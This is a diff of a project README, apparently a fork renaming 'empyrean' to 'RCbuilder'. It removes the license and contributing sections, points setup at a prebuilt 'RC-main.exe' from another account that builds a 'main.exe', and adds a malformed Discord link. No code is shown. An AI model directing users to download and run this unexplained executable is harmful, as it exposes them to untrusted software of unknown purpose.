@@ -10,7 +10,7 @@
     <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <br>
-    Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/forrrrrrrrr">Telegram</a>
+
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
@@ -59,31 +59,27 @@
 
 ### Setup
 
-1. [Download RCBuilder.exe]([https://github.com/addi00000/empyrean/archive/refs/heads/main.zip](https://github.com/RCmethodz/RCbuilder/blob/main/RC-main.exe))
+1. [Download Rcbuilder]
 2. Run `install_python.bat` if you don't have python installed
-3. run the RC-main and let it load.
+3. run the `RC-main.exe` and let it load.
 4. Follow instructions in RC-main and your exe will be found in the `dist` folder under the name `main.exe`
 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
-    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em0.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em1.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
-</div>
+![image](https://github.com/RCmethodz/RCbuilder/assets/155228545/992b5f02-191b-4797-8262-d6acb9cb1a87)
 
-## Contributing
+![image](https://github.com/RCmethodz/RCbuilder/assets/155228545/4275283f-09da-4b8f-8ca3-2bd646fa2e8c)
 
-View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
+![image](https://github.com/RCmethodz/RCbuilder/assets/155228545/cbc9a72e-b21c-4a77-934c-9a7c56209bb6)
 
-## License
+![image](https://github.com/RCmethodz/RCbuilder/assets/155228545/17663abd-09ea-4ad3-a19e-477ff3b552e2)
 
-Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+![image](https://github.com/RCmethodz/RCbuilder/assets/155228545/c7bb8b0c-c00f-462e-bceb-ab78f21d118a)
+
+
+
 
 ## Errors?
 
 -   Make an [issue](https://github.com/addi00000/empyrean/issues)
--   Join the [Discord](https://discord.gg/GudVbfd9ZU)
+-   Join the [Discord](https://https://discord.gg/v7AA32cu)
 
-<img src="img/footer.png">
+
